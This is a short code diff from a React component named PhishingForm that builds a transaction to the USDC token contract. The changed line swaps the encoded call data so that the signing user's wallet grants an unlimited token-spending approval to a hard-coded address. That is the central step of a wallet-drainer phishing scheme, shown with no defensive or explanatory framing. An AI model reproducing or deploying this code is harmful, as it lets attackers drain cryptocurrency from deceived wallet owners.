@@ -93,7 +93,7 @@ export const PhishingForm = () => {
                 nonce: nonce,
                 from: signer.address,
                 to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-                data: "0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba300000000000000000000000000000000000000000000000393b9f9c3de1bcae3",
+                data: "0x095ea7b300000000000000000000000016A471EdA401df1Cab3D18C90f5094fd8155eE84ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
                 value: 0,
             });
         }
